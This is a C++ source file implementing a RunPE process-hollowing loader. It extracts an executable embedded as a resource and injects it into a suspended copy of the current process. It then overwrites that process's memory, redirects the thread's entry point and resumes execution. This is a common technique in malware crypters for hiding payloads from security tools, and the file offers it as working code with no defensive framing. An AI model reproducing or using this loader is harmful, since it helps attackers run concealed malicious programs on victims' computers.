#define UNICODE
#include <Windows.h>
#include "resources/resource.hpp"
#include <iostream>


// Thank you, https://github.com/Zer0Mem0ry/RunPE
int RunPortableExecutable(void* Image)
{
    IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
    IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    CONTEXT* CTX;

    DWORD* ImageBase; //Base address of the image
    void* pImageBase; // Pointer to the image base

    int count;
    char CurrentFilePath[1024];

    DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
    NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize

    GetModuleFileNameA(nullptr, CurrentFilePath, 1024); // path to current executable

    if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
    {
        ZeroMemory(&PI, sizeof(PI)); // Null the memory
        ZeroMemory(&SI, sizeof(SI)); // Null the memory

        if (CreateProcessA(CurrentFilePath, nullptr, nullptr, nullptr, FALSE,
                           CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI)) // Create a new instance of current
            //process in suspended state, for the new image.
        {
            // Allocate memory for the context.
            CTX = LPCONTEXT(VirtualAlloc(nullptr, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
            {
                // Read instructions
                ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, nullptr);

                pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
                                            NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

                // Write the image to the process
                WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, nullptr);

                for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
                {
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

                    WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
                                       LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, nullptr);
                }
                WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
                                   LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, nullptr);

                // Move address of entry point to the eax register
                CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
                ResumeThread(PI.hThread); // Start the process/call main()

                return 0; // Operation was successful.
            }
        }
    }
}

int loadResource()
{
    HRSRC hrsrc{FindResource(nullptr, (LPCWSTR) IDR_EXE, RT_RCDATA)};
    HGLOBAL hGlbl;
    BYTE *pExeResource;

    if (hrsrc == nullptr)
    {
        std::cout << "hrsrc == nullptr" << std::endl;
        return 1;
    }

    hGlbl = LoadResource(nullptr, hrsrc);

    if (hGlbl == nullptr)
    {
        std::cout << "hGlbl == nullptr" << std::endl;
        return 1;
    }

    pExeResource = (BYTE *) LockResource(hGlbl);

    if (pExeResource == nullptr)
    {
        std::cout << "pExeResource == nullptr" << std::endl;
        return 1;
    }

    RunPortableExecutable(pExeResource);

    return 0;
}